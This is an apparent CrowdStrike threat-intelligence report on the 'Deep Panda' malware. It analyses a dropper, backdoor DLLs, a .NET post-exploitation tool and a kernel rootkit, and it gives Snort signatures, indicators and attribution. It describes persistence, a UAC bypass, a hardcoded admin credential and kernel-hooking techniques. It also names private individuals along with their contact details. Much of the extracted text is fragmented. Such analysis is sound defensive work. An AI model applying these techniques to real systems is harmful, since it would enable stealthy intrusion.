DEEP PANDA
INTELLIGENCE TEAM REPORT VER. 1.0
DEEP PANDA
11   EXECUTIVE SUMMARY                                                                       2
12   TECHNICAL ANALYSIS                                                                     3
       Dropper Sample (MD5: 14c04f88dc97aef3e9b516ef208a2bf5)                                3
       Backdoor DLL Sample (MD5: 47619fca20895abc83807321cbb80a3d)                           5
            Initial C2 Phone Home Beacon                                                     6
            Network Protocol and Implementation                                              7
            Backdoor Functionality, Supported Commands                                       7
       Post Exploitation Tool Sample (MD5: 2dce7fc3f52a692d8a84a0c182519133)                 8
            Network Protocol and Implementation                                              9
       Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)                          10
            C2 Communication Mechanisms                                                     12
            C2 Command Invocation                                                           13
       Kernel Driver Sample (MD5: dae6b9b3b8e39b08b10a51a6457444d8)                         14
            Entrypoint                                                                      14
13   MITIGATION / REMEDIATION                                                               18
       Network Signatures                                                                   18
       File System Artifacts                                                                19
       Registry Artifacts                                                                   19
       Other Artifacts                                                                      19
14   ATTRIBUTION                                                                            20
15   CONCLUSION                                                                             25
     Dropper/Implant #1                                                                     25
     Post Exploitation Tool                                                                 25
     Implant #2                                                                             26
     Backdoor DLL                                                                           26
     System Driver                                                                          26
16   APPENDIX                                                                               27
     Appendix A: Command Line Options for Post Exploitation Tool Sample                     27
     Appendix B: Algorithm for computing machine ID                                         28
     Appendix C: Remote Commands Supported by .NET Backdoor Post Exploitation Tool Sample   28
     Appendix D: Raw bytes of example Authentication packet.                                30
     Appendix E: Initialization of KEY and IV for AES                                       30
     Appendix F: Command & Control Servers                                                  31
     Appendix G: Edward Sun
s kernel network hook code                                      32
     Appendix H: Command and Control MD5 Correlation                                        41
DEEP PANDA
                                   EXECUTIVE SUMMARY
The samples were clearly malicious and varied in sophistication. All three samples provided remote access
to the attacker, via two Command and Control (C2) servers. One sample is typical of what is commonly
referred to as a 
dropper
 because its primary purpose is to write a malicious component to disk and connect
it to the targeted hosts operating system. The malicious component in this case is what is commonly re-
ferred to as a Remote Access Tool (RAT), this RAT is manifested as a Dynamic Link Library (DLL) installed
as a service. The second sample analyzed is a dual use tool that can function both as a post exploitation
tool used to infect other systems, download additional tools, remove log data, and itself be used as a
backdoor. The third sample was a sophisticated implant that in addition to having multiple communication
capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can
hide aspects of the tool from user-mode tools. This third component is likely used for long-term
implantation and intelligence gathering. Some AV engines occasionally identify this sample as Derusbi
Trojan. CrowdStrike Intelligence Team has seen Trojans from 8 different builder variants of this RAT,
including 64-bit versions, used in targeted attacks in 2011 against Defense, Energy/Power, and Chemical
Industries in US and Japan.
target various strategic interests of the United States including High Tech/Heavy Industry,
Non-Governmental Organizations (NGOs), State/Federal Government, Defense Industrial Base (DIB), and
organizations with vast economic interests. This report contains an in-depth technical analysis of the
samples, detection/remediation/mitigation information, attribution intelligence, and a conclusion aimed at
providing the reader with a synopsis of the report.
CROWDSTRIKE                                                                          S E N S I T I VE          2
DEEP PANDA
                                   TECHNICAL ANALYSIS
Dropper Sample (MD5: 14c04f88dc97aef3e9b516ef208a2bf5)
The executable 14c04f88dc97aef3e9b516ef208a2bf5 is commonly referred to as a 
dropper
, which is
designed with the purpose of extracting from itself a malicious payload and to initialize and install it into a
targeted system. In this case, the malicious payload is a Dynamic-Link Library (DLL), which enables an
attacker to have full control of the system. This code appears to have been compiled on Wednesday May
4th, 2011 at 11:04:24 A.M. UTC (equivalent to early evening time in China). Note that the timestamp is in
resolves several library functions provided by Microsoft using the LoadLibrary() and GetProcAddress()
Application Programming Interfaces (APIs). The imported function names are not encrypted; however, the
function name is minutely obfuscated by a simple single character substitution:
   //Obfuscation of GetTempPathA() API function call
   strcpy((char *)ProcName, 
2etTempPathA
   ProcName[0] = 
The dropper invokes the SHGetSpecialFolderPath() API supplying a Constant Special Item ID List (CSIDL)
CSIDL_COMMON_DOCUMENTS
 to identify the destination folder for the malicious DLL payload. The
users. A typical path is C:\Documents and Settings\All Users\Documents.
available name in this set:
       1.      infoadmn.dll
       2.      infoctrs.dll
       3.      infocardapi.dll
artifact which indicates the language setting on the compiler used by the person who built the binary was
CROWDSTRIKE                                                                           S E N S I T I VE            3
DEEP PANDA
code version. Since the dropped resource is not compressed, the routine fails. This indicates a low
parameter. This export then implements the actual install logic to maintain persistence and invoke the main
routine.
The dropper binary contains an icon resource that resembles the 
Google Chrome
 browser icon, the re-
systems language set to Chinese. The use of the Chrome icon may indicate a possible attempt to socially
CROWDSTRIKE                                                                       S E N S I T I VE            4
DEEP PANDA
Backdoor DLL Sample (MD5: 47619fca20895abc83807321cbb80a3d)
14c04f88dc97aef3e9b516ef208a2bf5. This code appears to have been compiled on Wednesday May 4th,
2011 at 10:48:19 A.M. UTC (equivalent to early evening time in China). It is instantiated when it is mapped
service despite the appearance. If the service is present, the malware replaces its previous instances or
versions of this backdoor. After attempting to disable the existing service, the malware tries to install itself as
a service with that same name. During installation, the sample attempts to use documented APIs such as
OpenSCManager() and CreateService() to initialize itself as a persistent Windows service. As a
precaution, the sample writes settings directly to the Windows Registry to accomplish the same goal if
installing the service with the documented APIs fails. The registry change creates the following key:
HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\msupdate\\Parameters
Following this, the subroutine will set the value of the 
ServiceDLL
 to the module handle of the DLL.
The next key to be changed is:
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost, which will have
the 
msupdate
 key set to 
msupdate
The export 
CollectW3PerfData
 is registered as the main function of the DLL. If the installation of the new
service is successful, the sample then starts the new service and exits. If the installation fails, the sample
exported function. In the case of installation failure, rundll32.exe calls the main functions export
over the machine, as rundll32.exe is frequently launched by tasks such as changing the time, wallpaper,
or other system settings. This means that after cleaning up the components dropped by the malware, the
system remains vulnerable to local attacks by simply overwriting the legitimate rundll32.exe executable with
a malicious version and await it
s automatic execution by the Operating System.
Window with class 
NOD32_%d
 where %d is replaced with a pseudo-random number. This may be an
attempt to fool some automated dynamic analysis or anti-malware software into believing this is the
After creating this window, the routine starts the main thread that eventually initiates calling out to the
Command and Control (C2). In order to accomplish this task, the newly
CROWDSTRIKE                                                                            S E N S I T I VE           5
DEEP PANDA
created thread initializes networking APIs using WSAStartup() and resolves some other APIs dynamically
using LoadLibrary() and GetProcAddress(). Once the proper API
s have been resolved, the sample then
assigns a NULL SID to the rundll32.exe executable and sets the current process
 Window Station to
winsta0
, which enables the sample to access the real user
s desktop if started as service.
The communication to the C2 is handled by a while() loop, with each successive connection attempt
causing the loop to invoke the Windows Sleep() API for a time interval of 2 seconds, exponentially
increasing in length up to 1024 seconds (17 minutes) and then restarting back to 2 seconds.
Initial C2 Phone Home Beacon
in the binary, using the User-Agent string 
Google
, this code is not activated due to the format of the stat-
a raw socket to the C2 located at 1.9.5.38:443. This indicates the use of a 
boiler plate code
 or a builder
software package that automates the creation of the malicious sample.
The malicious sample sends an initial beacon to the C2 that includes the following information:
          Desktop session or 
none
 otherwise.
The following python function can be used to decode the beacon stings:
 def decode(crypted):
 decoded=
   for x in crypted:
     decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)
   return decoded
CROWDSTRIKE                                                                          S E N S I T I VE            6
DEEP PANDA
After sending the initial beacon, the routine loops receiving incoming commands and executes them in
sequence. When a connection can successfully be established to the C2 server, the sleep timer is reset to
two seconds for the next attempt.
Network Protocol and Implementation
The network protocol used by this sample resembles a 
Type-Length-Value
 layout in both directions.
Each 16 byte request header consists of:
       2. A 4-byte little-endian payload length
       3. 8 bytes remaining are a request header that is typically uninitialized and only used by some
          commands instead of the arbitrary length payload
buffer of 408 bytes size. Providing additional payload of any larger size will result in a trivial exploitable stack
exploitation of this vulnerability is unnecessary due to the already available unauthenticated command
execution capabilities of this backdoor.
Certain commands initiate a second connection to the C2 in a separate thread using the same network
Backdoor Functionality, Supported Commands
The primary aim of this backdoor is remote desktop control functionality comparable to VNC or Remote
Desktop over a custom protocol. It allows the adversary to view the main desktop graphically and
control the keyboard and mouse. This remote control functionality is implemented as separate messages
0x22000001 initiates continuous transmission of screen captures to the C2. The screen captures are
created using a series of Microsoft Windows Graphic Device Interface (GDI) API calls culminating in a call to
GetDIBits().
Command 0x20000001 exits the backdoor and 0x20000000 is issued to completely remove the backdoor
from the system.
CROWDSTRIKE                                                                             S E N S I T I VE           7
DEEP PANDA
When command 0x23000004 is received, a temporary new user 
_DomainUser_
 with password 
Dom4!nU-
serP4ss
 is created and added to the local Administrators group. The backdoor is then started under that
account and the user is deleted. It would appear this technique is meant to obfuscate the activities of the
malicious sample by masking the process creator
s user name to appear to be a generic domain user. Note
that such an account does not normally exist in an Active Directory environment.
Additionally, the primary C2 connection allows for requests to start additional connections to the C2 imple-
menting the following functionality:
          killing of running processes
          output of arbitrary executables; initiated by command 0x23000000
Post Exploitation Tool Sample (MD5: 2dce7fc3f52a692d8a84a0c182519133)
This sample is typical of a post exploitation tool; it is written in .NET 2.0. This code appears to have been
compiled on Thursday May 26th, 2011 at 10:21:44 A.M. UTC (early evening time in China). The backdoor
functionality can be instantiated either directly from the command line or through commands issued over a
network based protocol via the C2. If no arguments are given, a connection to the C2 is initiated to the stati-
line arguments can be viewed in Appendix A. This activity is generally associated with log cleaning to com-
plicate a forensic investigation.
The sample contains an embedded IP address for C2 that is stored in an encrypted format as a string re-
source:
CROWDSTRIKE                                                                         S E N S I T I VE           8
DEEP PANDA
202.86.190.3:80 (Hong Kong: TeleOne(HK) Limited).
Network Protocol and Implementation
There are three components to the protocol:
Authentication is accomplished using a 32 byte packet, this packet consists of:
       2. A four byte random number generated by the rand() function
       3. The machine ID comprised of an obfuscated combination of the Machine name and hard drive
          serial number. The algorithm for generating this is in Appendix B
       4. The communication protocol version number, which in this sample is 0x2
       5. The version of the malicious sample, in this case it is 841
An example authentication packet sent to the C2 is located in Appendix E
to the client which is then RC4 encrypted using the random number generated in step 2 from above as the
password. This value is then transformed using a simple algorithm in Appendix F into a 32 byte array. The
up AES encryption which is then used to encrypt and decrypt any further communications.
CROWDSTRIKE                                                                       S E N S I T I VE          9
DEEP PANDA
Beacon, this is typical of this type of malicious sample, it allows the operator to separate various infected
hosts in a targeted campaign. The beacon for this sample is formatted as XML and consists of:
An example of an unencrypted beacon:
       <?xml version=
 encoding=
utf-16
       <BasicInfo xmlns:xsi=
http://www.w3.org/2001/XMLSchema-instance
 xmlns:xsd=
http://www.
       w3.org/2001/XMLSchema
        <HostName> Infected System Hostname</HostName>
        <int_0>-8</int_0>
        <osVersion>Microsoft Windows NT 6.1.7601 Service Pack 1</osVersion>
        <string_0>12/27/2011 16:34:36</string_0>
        <Version>2</Version>
       </BasicInfo>
Command handling loop, this is a loop structure that will process and execute commands sent by the C2.
The malware sends and receives a heartbeat/keepalive packet every 2 minutes. The command format is
derived from a structure consisting of:
description of the possible values for commands is in Appendix D. It is important to note that the order in
calling methods on those assemblies, connecting to new C2 servers and executing processes.
Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)
Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)
This sample is a sophisticated backdoor which implements several communications protocols and was
UTC (late evening time in China). The code contains several Run Time Type Information (RTTI) artifacts that
CROWDSTRIKE                                                                          S E N S I T I VE           10
DEEP PANDA
Variants of this Trojan are sometimes detected under the name 
Derusbi
 by Microsoft, Trend, Sophos and
Symantec AV engines.
This sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide
an interactive command line shell to the C2. It also is able to bypass User Account Control (UAC) to install
itself by using the 
sysprep.exe
 Microsoft Windows executable provided by the targeted system. The steps it
takes to install itself onto a system are as follows:
        1. Copies itself to to %WINDIR%\system32\Msres<3 random characters>.ttf
           the current system time when the copy was made but with the year changed to 2005.
           MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service>
 This defaults to 
wuauserv
        4. Adds itself to list of services started by 
netsvc
 using the service name 
helpsvc
        5. If McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules
           the copy to be deleted on reboot using the well documented MoveFileExA API.
        6. It then calls either the original or copy of regsvr32.exe with the parameters /s /u and the path to
           the copy of itself it made in Step 1. The /u parameter means 
uninstall
, which calls
           DllUnregisterServer, this is an unsophisticated method of DLL entry point obfuscation.
        7. DllUnregisterServer installs the driver and initiates the backdoor component.
 is running (AntiVirus360 program from the Chinese 
Quihoo 360 Technology Co., LTD
 360              ),
or the username of the DLL
s host process context is not 
SYSTEM
, the driver is not written to disk. Barring
the two aforementioned conditions, the sample decrypts the kernel driver to:
        
%sysdir%\Drivers\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys
                                                                                                                 -
hash of dae6b9b3b8e39b08b10a51a6457444d8.
               
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security
code.
CROWDSTRIKE                                                                         S E N S I T I VE             11
DEEP PANDA
the backdoor then loads the original service
s DLL into the address space with LoadLibrary and invokes the
ServiceMain export. This effectively hijacks the original service
s entry while retaining its functionality.
While there is code in the binary that allows downloading a list of C2 servers from an HTTP URL, the default
the one used by the post exploitation .NET tool.
 C2 Communication Mechanisms
The malware has three distinct C2 protocols two of which can be transmitted over HTTP proxies and one
can be bundled in two different 
dual
 modes (see 3.), totaling 7 distinct supported C2 mechanisms. The con-
       1. Proprietary binary header (optionally over an HTTP Proxy using CONNECT mechanism); this
          protocol consists of 64 random bytes being sent to the C2. The C2 then responds with 64 bytes
          bytes rotated right by seven bits and compares that value to the seven bits rotated right version of
          the server
s response, effectively neutralizing the rotation
s effect; the purpose of this is unclear.
          request string including HTTP headers (optionally over a HTTP Proxy using CONNECT). The
          malware requires the response to start with 
HTTP/1.0 200
 or 
HTTP/1.1 200
 and an absence of
          a 
Connection: close
 header. This one HTTP connection will be used for bi-directional
          communications, sending chunks of POST payload and receiving chunks of the response,
          interleaved.
       3. Two long-running HTTP requests to the same C2 (optionally over an HTTP Proxy with original
          request verb), one GET request to 
/Photos/Query.cgi?loginid=
 followed by a random number
          and one POST request to 
/Catelog/login1.cgi
. The GET request serves as a down-stream
          channel while the POST request serves as a upstream channel.
legitimate appearing channels as required in order to appear Request For Comment (RFC) compliant with
the HTTP protocol.
CROWDSTRIKE                                                                         S E N S I T I VE           12
DEEP PANDA
due to time constraints.
After establishing any of the aforementioned channels for arbitrary binary data exchange, the malware will
start sending and receiving compressed binary blobs via the channel of choice. The C2
s binary data blobs
are compressed. No further encryption of the data takes place.
All C2 transport implementations contain code for accepting and handling server-side connections of the
respective protocols. However, this code does not appear to be invoked. It appears that the author of this
code shares the library that implements these transports for the client with the C2 server.
C2 Command Invocation
The main backdoor thread then reads commands from the chosen C2 protocol and passes them on to any
of the following registered handler classes based upon a command ID. The handler class is responsible for
parsing the remainder of the command.
PCC_PROXY: TCP Proxy
This handler class implements a generic TCP proxy. It supports establishing TCP connections to other hosts
and also listening for incoming connections. The incoming connection contents are forwarded to the C2 and
data from the C2 is passed on to connections. It supports up to 1024 parallel connections.
PCC_MISC : Gather and report system information
The malware is capable of gathering various pieces of information from the system, triggered by a command
ID 10. The capabilities include recovering authentication credentials from various system and client storage
such as Mozilla Firefox, Internet Explorer, and Remote Access Service (RAS). This class also supports
gathering intelligence on the infected system including identifying security tools by their process name, proxy
accounts, and version numbers for the Operating System (OS) and Internet Explorer.
PCC_SYS: System Management
This handler class provides the attacker with the ability to manage system components including start/stop/
delete system services, enumerate/alter registry keys, and manage running processes. This class also
provides the ability for the attacker to take a screen shot of the users desktop.
INTERNAL_CMD: Command-Line Shell
CROWDSTRIKE                                                                         S E N S I T I VE          13
DEEP PANDA
This handler class uses the command ID 5 and implements an interactive command line shell accessible
from the C2 server, containing a series of built-in commands. If the input is not in this list of built-in
commands, the malware attempts to invoke cmd.exe in the background, launching a command or command
line utility already present on the system. The standard output channel of that command is provided back to
the C2. The supported built-in commands are:
Kill Switch / Self-Destruction
The only command that is implemented directly in the main backdoor thread as a subprocedure call and not
via a generic command handler class is command ID 256. This command results in the DLL deleting itself
and terminating the backdoor process.
Kernel Driver Sample (MD5: dae6b9b3b8e39b08b10a51a6457444d8)
This sample is a packed 32-bit kernel driver extracted by the aforementioned DLL with an MD5 hash of:
de7500fc1065a081180841f32f06a537, this sample will only function on a Windows 32-bit kernel. This code
appears to have been compiled on Sunday October 9, 2011 at 4:50:31 P.M. UTC (very early morning time
of Monday, October 10 in China).
Entrypoint
This section describes how the driver performs its initialization routine.
Multiple Instance Protection
The driver begins by opening a named event in the BaseNamedObjects object directory with the name
exists, the driver fails to load, presumably to avoid a
CROWDSTRIKE                                                                      S E N S I T I VE         14
DEEP PANDA
multiple instances of itself. If the event does not exist, the driver then creates it using the Windows API
and indicative of relatively limited Windows API knowledge of the author of that part of the code. It is
interesting to note that some of the hex digits in the object name are mixed case which is potentially
indicative of the code being re-appropriated from another source.
Anti-Debugging Protection
The second component of the entry point performs an anti-debugging technique, calling the function
KdDisableDebugger(), which allows the driver to disable usage of the built-in Windows kernel debugging
facility that is used by popular kernel debuggers KD and WinDbg. Tools such as Syser Debugger, or
debugging through a virtual machine are unaffected by this technique. The sample, rather than importing the
KdDisableDebugger() API using conventional methods, looks up the API through
MmGetSystemRoutineAddress() instead. All of the other APIs used by the driver are imported normally, so
this is not a technique to hide import APIs used throughout the driver. Searching Google for
MmGetSystemRoutineAddress
 and 
KdDisableDebugger
 results in dozens of Chinese language blogs
which explain how to use this technique to 
Disable WinDbg
Hooking
is designed to hook the system call table, while the other hooks the network stack.
Network Stack Hooking
the version is necessary because Windows versions beginning with Vista utilize a redesigned TCP/IP net-
work stack, most hooking operations will require a different implementation for these versions. On versions
prior to Windows Vista, the TCP/IP driver creates a \Device\Tcp device object through which most network
requests are piped through. On Vista and later, TCP/IP has been split up into multiple components, and IP
connection enumeration, which this driver is targeting, is managed by \Device\nsiproxy instead.
In either case, the driver obtains the device object by using IoGetDeviceObjectPointer() and hooks Major
Function 14 the IRP_MJ_DEVICE_CONTROL, as this is the function through which all Input Output
ConTroLls (IOCTLs) are sent, such as the IOCTL for querying active IP connections.
Network Store Interface (NSI) Hook
The NSI hook, targets IOCTL 0x12001B, which is used by NsiGetObjectAllParameters() in nsi.dll when
users typically run commands such as netstat.exe or use any of the IP Helper APIs in iphlpapi.dll. The
purpose of the hook is to scan the list of active connections returned to the user, and hide any such
connection currently bound to a local TCP port in
CROWDSTRIKE                                                                           S E N S I T I VE        15
DEEP PANDA
the range between 40000 and 45000. The hooking is performed by creating a new completion routine
associated with any IRP_MJ_DEVICE_CONTROL IRP that matches the IOCTL, attaching to the target
process, performing several memory copies to hide the entry, and detaching.
This functionality is nearly identical to the code posted by Edward Sun (aka cardmagic, sunmy1@sina.com,
onlyonejazz@hotmail.com, cardcian@mail.ustc.edu.cn, QQ# 28025945) from Hefei, Anhui province
(Nanjing Military District) on July 8, 2007, then a China-based researcher at Trend Micro (now working at
                                                                                                          at
http://forum.eviloctal.com/viewthread.php?action=printable&tid=29604 (See Appendix G). CrowdStrike has
no information connecting Mr. Sun to this intrusion activity, his code appears to have been appropriated by
the actor to add similar functionality to their code.
TCP Hook
The TCP hook works almost identically to the NSI hook, though instead hooking IOCTL 0x120003 (IOCTL_
any connections listening on TCP ports in the range between 40000 and 45000.
System Call Hooking
DWORD at each of these exported functions. Because the system call stub uses the EAX register as an
index for the system call ID, and a 
mov eax, imm32
 instruction
 instruction is used, this second DWORD
will match the system call ID. It then adds this index to the value of KeServiceDescriptorTable.Base, which
is the exported kernel variable (on 32-bit Windows only) which directly points to the system call table. This is
one of the simplest ways to do a system call hook, but will not work on 64-bit Windows as this variable is not
exported in addition to the protection provided by Microsoft PatchGuard.
Windows API IoAllocateMdl(), and associating the MDL to a non-paged buffer using
MmBuildMdlForNonPagedPool(). Once the MDL is associated to the non-paged buffer, the sample locks the
underlying pages using the Windows API MmProbeAndLockPages(). Instead of hooking the entry in the
table directly, which is easily detectable, the driver uses the LDASM open-source disassembly engine to
analyze the function that is being pointed to by the table, and applying a Detours-style hook directly in the
code. It uses the standard 
mov cr0, eax
 technique, turning off the Write Protect (WP) bit as it does this.
When the hook is installed, it writes a special DWORD value, 
KDTR
, which allows it to prevent
double-hooking or badly-hooking the system call, during unhooking, this value is also checked.
Registry Hooks
                                       \\REGISTRY\\MACHINE\\SYSTEM is blocked. RegSaveKey() which is
backup of a particular registry key.
 CROWDSTRIKE                                                                         S E N S I T I VE          16
DEEP PANDA
\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\. It then checks for the values of the
ServiceDll
 and 
Security
 keys, in the latter case it applies an XOR on the data with the value 127. The
user-mode component of this malware is a service called 
msupdate
, this driver is attempting to hide the
key, due to the fact that these APIs provide almost identical functionality when it comes to reading registry
values.
In the registry hooking code of the driver, a call is made to ObReferenceObjectByHandle(). This allows the
driver to receive the 
CM_KEY_OBJECT
 which is then used with ObQueryNameString() to get the key/value
path. However, no call to ObDereferenceObject() is ever made, which means that all registry objects being
sent to these APIs are eventually leaked.
In the registry hook, it was noticed that 
CurrentControlSet001
 was used as the target, if the target machine
function as intended. This is the reason the Microsoft implemented a symbolic link to \\CurrentControlSet
CROWDSTRIKE                                                                         S E N S I T I VE            17
DEEP PANDA
                            MITIGATION / REMEDIATION
Network Signatures
The following network signatures are designed for the popular Open Source IDS called Snort.
These signature can be ported to other formats upon request.
Malware #1
 alert tcp any any <> any any (msg: 
BackDoor Beacon Attempt
; content:
|78 7c
 71 4c 4a 49 49 49 4A 4C 46|
; classtype:backdoor; sid:123456; rev:27122011;)
 alert tcp any any <> any any (msg: 
BackDoor Beacon Attempt
; content:
Goo-
 gle
; http_uri; classtype:backdoor; sid:123457; rev:27122011;)
 alert ip 1.9.5.38 any <> any any (msg: 
Malicious Host Detected
; class-
 type:backdoor; sid:123460; rev:27122011;)
Malware #2
 alert tcp any any <> any any (msg:
BackDoor Beacon Attempt
; content:
|03 01
 74 80 82 21 b5 64 c2 74 22 e3 02 00 00 00 49 03 00 00 00 00 00 00 00 00 00 00
 0000 00 00|
; classtype:backdoor; sid:123458; rev:27122011;)
 alert ip 202.86.190.3 any <> any any (msg:
Malicious Host Detected
; class-
 type:backdoor; sid:123459; rev:27122011;)
Malware #3
 alert tcp any any <> any any (msg: 
BackDoor C2
; content: 
POST /forum/
 login.cgi HTTP/1.1
; content:
User-Agent: Mozilla/4.0
; classtype:backdoor;
 sid:123461; rev:27122011;)
 alert tcp any any <> any any (msg: 
BackDoor C2
; content: 
GET /Photos/Query.
 cgi?loginid=
; classtype:backdoor; sid:123462; rev:27122011;)
 alert tcp any any <> any any (msg: 
BackDoor C2
; content: 
POST /Catelog/
 login1.cgi HTTP/1.1
; content:
User-Agent: Mozilla/4.0
; classtype:backdoor;
 sid:123461; rev:27122011;)
 CROWDSTRIKE                                                                   S E N S I T I VE   18
DEEP PANDA
File System Artifacts
Dropper/DLL
C:\Documents and Settings\All Users\Documents\infoadmn.dll (TS: 2007-03-07 00:00:00)
C:\Documents and Settings\All Users\Documents\infoctrs.dll (TS: 2007-03-07 00:00:00)
C:\Documents and Settings\All Users\Documents\infocardapi.dll (TS: 2007-03-07 00:00:00)
MD5: 47619fca20895abc83807321cbb80a3d
Post Explotiation Tool
MD5: 2dce7fc3f52a692d8a84a0c182519133
Backdoor
MD5: de7500fc1065a081180841f32f06a537
Kernel Driver:
MD5: dae6b9b3b8e39b08b10a51a6457444d8
%sysdir%\Drivers\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys
Registry Artifacts
The following Windows Registry artifacts are indicative of a compromised host:
Dropper/DLL
HKLM\\SYSTEM\\CurrentControlSet\\Services\\msupdate
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost which will have
the 
msupdate
 key set to 
msupdate
Backdoor
HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Msres<3 character rand>.ttf
Other Artifacts
Dropper/DLL
Username: _DomainUser_ Password:
Dom4!nUserP4ss
Backdoor
The backdoor may be detected by several different Anti-Virus products under a signature with the name:
Derusbi
Kernel Driver
Object: {8CB2ff21-0166-4cf1-BD8F-E190BC7902DC}
CROWDSTRIKE                                                                      S E N S I T I VE        19
DEEP PANDA
                                                          ATTRIBUTION
 Attribution in the cyber domain is always a tricky subject when relying solely on malicious samples.
 Compiler artifacts and language settings can of course be deliberately masked or spoofed. CrowdStrike
 uses a unique approach of comprehensive threat analysis in order to decipher attributable components.
 Based on the corroborating evidence discovered in the course of this analysis, it appears there are
 numerous indications that this is a Chinese-speaking actor.
                                                              , a Chinese security product available from
 http://www.360.cn/. This is particularly relevant in this case because the backdoor DLL sample with an MD5
 this tool. Speculatively this may be because this security product detects this rootkit, or the author was
 attempting to prevent accidental infection on systems running this Anti-Virus product.
 The obfuscation of the KdDisableDebugger() function call is seen on several Chinese language forums,
 and can be seen being reused in several code samples on those forums. As previously mentioned there is
 no advantage associated with using this call obfuscation, and appears to be reused for no apparent reason
 other than the attackers have copied code directly from forum code.
 While the various network hooking techniques used in the kernel driver may appear novel or well
rootkit.com
 by a Chinese language developer. This post is currently mirrored on dozens of Chinese hacking
 websites.
 Similarly the system call hooking is less impressive after searching for 
IoAllocateMdl
 and 
 (bbs.pediy.
 com/showthread.php?t=77467
 perform system call hooking through MDLs. The ldasm inline hooking is also repeated in numerous postings
 to Chinese forums. One particular website (http://read.pudn.com/downloads197/sourcecode/windows/sys-
 tem/927802/CCRootkit/RootkitSys/HookSSDT.c__.htm) had an almost identical ldasm loop that tried to
 identify the exact same code sequences. Open source research of the 4 innocuous kernel APIs
 Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs.
 While the driver does not use pool tags for most of its allocations, it does utilize them in the networking
 hooking code, much like the examples found on the Chinese language forums. This sample uses pool tags:
tnet,
 and 
KDTR
. Although the meaning of the KDTR tag is not
1 http://bbs.pediy.com/showthread.php?t=125358
 http://kost0911.pixnet.net/blog/post/36914183-anti-anti-windbg
  CROWDSTRIKE                                                                        S E N S I T I VE         20
DEEP PANDA
coincides with the matching functionality of the detour-style inline hook.
The driver code (MD5: dae6b9b3b8e39b08b10a51a6457444d8) appears to be a combination of various
code that is easily searchable on the Internet, and almost always attributed to Chinese language forums
and websites. The system call hooking parts of the code appear to be identical to the HookSSDT.c code
authored by Steven Lai 
embedlinux
 and utilized in what the author titled 
CC Rootkit
 on on August 4, 2008
s email address is hqulyc@126.com. This user has a QQ identity of: 5054-3533, QQ is a popular
(http://user.qzone.qq.com/50543533) appears to be Steven Lai. He was is 28 years old (born September 5,
at Xiamen XOCECO New Technic Co., Ltd. (http://www.likego.com/en/about.asp), a company that builds
however was used by whomever built the kernel driver utilized by the backdoor and for this reason we are
providing the background on this individual.
 CROWDSTRIKE                                                                      S E N S I T I VE         21
DEEP PANDA
               ATTRIBUTION
               For more information about Intelligence-as-a-Service or
               specific attribution information on Deep Panda, contact
               the CrowdStrike Global Intelligence Team
 CROWDSTRIKE                                                       S E N S I T I VE   22
DEEP PANDA
               ATTRIBUTION
               For more information about Intelligence-as-a-Service or
               specific attribution information on Deep Panda, contact
               the CrowdStrike Global Intelligence Team
 CROWDSTRIKE                                                             S E N S I T I VE   23
DEEP PANDA
                      ATTRIBUTION
                     For more information about Intelligence-as-a-Service or
                     specific attribution information on Deep Panda, contact
                     the CrowdStrike Global Intelligence Team
(http://read.pudn.com/downloads197/sourcecode/windows/system/927802/CCRootkit/RootkitSys/HookSS-
DT.c__.htm).
According to this Linux driver development guide 
embedlinux
 published on July 31, 2008 (http://wenku.
baidu.com/view/e24205294b73f242336c5f45.html), t
 CROWDSTRIKE                                                                     S E N S I T I VE         24
DEEP PANDA
                                            CONCLUSION
The samples involved in this incident are typical of attacks commonly associated with the People
Republic of China (PRC). These code samples have a variety of Tools, Techniques, and Procedures (TTPs)
The ability to conduct Incident Response (IR) including forensics, and log analysis, greatly augments this
visibility into these aspects of the incident. Some indications as to the adversaries
 capabilities can be
derived from the captured samples alone.
Dropper/Implant #1
The dropper code (MD5: 14c04f88dc97aef3e9b516ef208a2bf5) does not utilize any techniques that are
unique or unusual, and is consistent with tools, techniques, and procedures of attacks targeting proprietary
information and generally attributed to the PRC. The presence of dead code and its replacement by a more
side. The 
dead code
 utilizes a more sophisticated compression algorithm provided by a third party which
was rendered useless for some reason. This may have been a result of the attacker modifying an existing
tool, or unknowingly using a re-purposed tool. The dropper resources indicate the compiler used to build the
tool was running on a system that utilized the Chinese 
Simple
 language pack and was built on Wednesday
May 4th, 2011 at 11:04:24 A.M. UTC (early evening time in China). While this can be deliberately spoofed
speaking actor.
The dropped DLL (MD5: 47619fca20895abc83807321cbb80a3d) itself contains functionality that is typical
                                                                                                                   -
encryption/obfuscation using a statically compiled XOR key. The sample uses TCP port 443 for commu-
nication, but makes no attempt to mimic the SSL protocol typically used on that port number, which would
provide enhanced Operational Security (OPSEC). This code appears to have been compiled on Wednes-
day May 4th, 2011 at 10:48:19 A.M. UTC (early evening time in China).
Post Exploitation Tool
The post exploitation tool (MD5: 2dce7fc3f52a692d8a84a0c182519133) is a dual-use tool, it can be
dropped and executed by a client-side exploit, or the adversary can launch it using a variety of command
line options. This tool is built in Microsoft .NET framework, which is typically an indication of a less sophis-
ticated attacker, because .NET is easier to develop in but requires the .NET framework be present on the
victim machine. The tool appears to have been compiled on Thursday May 26th, 2011 at 10:21:44 A.M.
UTC (early evening time in China). The sample utilizes the AES cryptographic algorithm to protect its C2
communications.
 CROWDSTRIKE                                                                          S E N S I T I VE             25
DEEP PANDA
Implant #2
Backdoor DLL
This DLL is a moderately sophisticated backdoor with several well designed communication mechanisms
not typically seen in these types of implants. The code base for the sample was developed in C++. The
